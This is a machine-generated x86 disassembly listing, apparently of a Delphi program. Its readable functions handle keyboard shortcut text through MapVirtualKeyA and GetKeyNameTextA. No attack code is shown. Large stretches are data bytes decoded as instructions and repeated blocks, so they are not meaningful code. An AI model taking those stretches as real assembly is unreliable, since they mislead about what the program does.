xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor eax [ eax ]
mov al [ 0x3c00419d ]
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp ecx
aaa
inc esp
add [ ebp + 0x389c0040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmp [ eax + eax ] al
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
nop
aaa
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
dec eax
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jns r-xdata
or eax 0x6f42616d
insd
outsb
add eax 0x756e654d
jae r-xdata
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or al 0x17
inc esp
add [ eax ] cl
add bh bh
test [ ecx + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
push cs
inc ecx
add [ eax ] dh
add [ eax ] al
[ eax - 0x7b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
mov [ edi ] cl
inc ecx
add [ ebp + ecx * 4 - 0x725bffbc ] bl
inc esp
add [ ecx ] al
push esp
das
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
cmp [ eax + eax + 0x78 ] al
add [ eax ] al
add [ eax + 0x34 ] bh
inc esp
add [ esp + 0x41 ] cl
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ebx
push 0x65676e61
hlt
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8c65646f
aaa
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax + eax + 0x69 ] al
add [ eax ] al
[ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x800443b
inc ecx
add [ edx + edi ] bl
inc ecx
add [ eax - 0x33ffbec4 ] bl
cmp [ ecx ] al
dec eax
cmp [ ecx ] eax
pop eax
xchg [ eax + eax + 0xa ] eax
push esp
push eax
outsd
jo r-xdata
add [ eax + 0x15 ] bh
outsb
pushad
sub eax 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
popad
push esp
outsd
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
rol [ eax + 0x3b ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi + 0x44 ] dl
add [ eax + eax ] dl
add [ eax ] al
js r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_438b7c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
xor [ eax ] al
js r-xdata
add [ eax - 0x53ffbfd0 ] dl
lodsb [ esi ]
sub al [ edx ]
adc [ ebx ] ch
inc edx
add al dh
sub al [ edx ]
fsubr [ edx ]
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ edi ] ch
inc edx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
imul esi [ ebx + 0x74 ] 0x443bac90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x800443b ] bh
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44367c
xchg [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
inc eax
add [ ecx ] al
dec ebp
jb r-xdata
inc ecx
jne r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
popad
ja r-xdata
lodsb [ gs : esi ]
push cs
inc ecx
add [ eax ] dh
add [ eax ] al
[ eax - 0x7b ]
add bh bh
jl r-xdata
outsd
je r-xdata
outsb
je r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
int3
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + esi + 0x44 ] cl
add [ esi ] al
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
sub eax 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
push eax
aaa
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
nop
aaa
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
shl [ edi ] 0x1
jo r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
je r-xdata
or eax 0x6f42616d
insd
jo r-xdata
je r-xdata
add [ eax + esi - 0x72abffc0 ] ch
inc esp
add [ eax ] dl
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx + eax * 4 ] ah
inc esp
add al al
add [ eax + eax + 0x3c ] 0x340041a1
mov [ 0xffffffffa4640041 ] al
inc ecx
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add al ah
mov [ eax + eax + 0xc ] es
add [ eax + eax + 0x50 ] 0x3c004479
add [ eax + eax - 0x78 ] 0x4000448d
mov es [ eax + eax + 0xa ]
push esp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
cmp [ eax + eax + 0x78 ] al
add [ eax ] al
add [ eax + 0x34 ] bh
inc esp
add [ esp + 0x41 ] cl
outsd
inc edx
outsd
je r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + esi + 0x740d0044 ] cl
bound edx [ edx + 0x69 ]
push 0x74754274
je r-xdata
add [ eax ] al
xchg [ eax + eax + 0x10 ] al
xchg [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
xor [ eax ] al
push esp
lea eax [ eax + eax + 0x10 ]
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add al ah
test [ eax + eax - 0x10 ] eax
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
outsb
jne r-xdata
outsd
cmp [ eax ] bh
inc esp
je r-xdata
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
cmovno eax [ eax ]
pushfd
lea eax [ eax + eax - 0x5c ]
lea eax [ eax + eax + 0x1 ]
dec eax
outsd
je r-xdata
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
dec esp
movsb [ edi ] [ esi ]
inc ecx
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
aaa
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor eax [ eax ]
mov al [ 0x3c00419d ]
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp ecx
aaa
inc esp
add [ ebp + 0x389c0040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmp [ eax + eax ] al
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
dec eax
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jns r-xdata
outsb
add eax 0x756e654d
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or al 0x17
inc esp
add [ eax ] cl
add bh bh
test [ ecx + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
push cs
inc ecx
add [ eax ] dh
add [ eax ] al
[ eax - 0x7b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
mov [ edi ] cl
inc ecx
add [ ebp + ecx * 4 - 0x725bffbc ] bl
inc esp
add [ ecx ] al
push esp
das
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ebx
push 0x65676e61
hlt
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8c65646f
aaa
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax + eax + 0x69 ] al
add [ eax ] al
[ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x800443b
inc ecx
add [ edx + edi ] bl
inc ecx
add [ eax - 0x33ffbec4 ] bl
cmp [ ecx ] al
dec eax
cmp [ ecx ] eax
pop eax
xchg [ eax + eax + 0xa ] eax
push esp
push eax
outsd
jo r-xdata
add [ eax + 0x15 ] bh
outsb
pushad
sub eax 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
rol [ eax + 0x3b ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi + 0x44 ] dl
add [ eax + eax ] dl
add [ eax ] al
js r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_438b7c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
xor [ eax ] al
js r-xdata
add [ eax - 0x53ffbfd0 ] dl
lodsb [ esi ]
sub al [ edx ]
adc [ ebx ] ch
inc edx
add al dh
sub al [ edx ]
fsubr [ edx ]
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ edi ] ch
inc edx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
imul esi [ ebx + 0x74 ] 0x443bac90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x800443b ] bh
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_4439b2
inc esp
add [ eax + 0x7e ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
cmovno eax [ eax ]
pushfd
lea eax [ eax + eax - 0x5c ]
lea eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jo r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
dec eax
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
or al 0x17
inc esp
add [ eax ] cl
add bh bh
test [ ecx + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8c65646f
aaa
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
je r-xdata
inc ebx
push 0x65676e61
hlt
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
or eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax + eax + 0x69 ] al
add [ eax ] al
[ ecx ]
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
rol [ eax + 0x3b ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi + 0x44 ] dl
add [ eax + eax ] dl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x800443b
inc ecx
add [ edx + edi ] bl
inc ecx
add [ eax - 0x33ffbec4 ] bl
cmp [ ecx ] al
dec eax
cmp [ ecx ] eax
pop eax
xchg [ eax + eax + 0xa ] eax
push esp
push eax
outsd
jo r-xdata
add [ eax + 0x15 ] bh
outsb
pushad
sub eax 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_438b7c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
xor [ eax ] al
js r-xdata
add [ eax - 0x53ffbfd0 ] dl
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
lodsb [ esi ]
sub al [ edx ]
adc [ ebx ] ch
inc edx
add al dh
sub al [ edx ]
fsubr [ edx ]
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ edi ] ch
inc edx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
imul esi [ ebx + 0x74 ] 0x443bac90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x800443b ] bh
sub_443bf8
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_433308
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_438b7c
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_443c50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_443c88
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403eb4
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404124
sub_443cdc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_443ec5
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f4c
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_40409c
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f4c
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f4c
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_40409c
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_40409c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403eb4
mov eax esi
call sub_403eb4
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f4c
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407de8
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041c0
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_443c88
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40417c
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f4c
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40417c
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40417c
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40417c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443ecc
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed8
retn
sub_443ee0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404174
push eax
mov eax edi
call sub_404174
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404174
push eax
mov eax edi
call sub_404374
push eax
mov eax [ esi ]
call sub_404374
pop edx
pop ecx
call sub_407b60
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404174
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404414
sub_443f3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_444017
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_443ee0
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_443ee0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_443ee0
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_443ee0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44401e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_443cdc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407b10
test eax eax
jne r-xdata
sub_444054
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_4465f4
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_446604
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_4440b4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_4465f4
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4465f4
mov esi eax
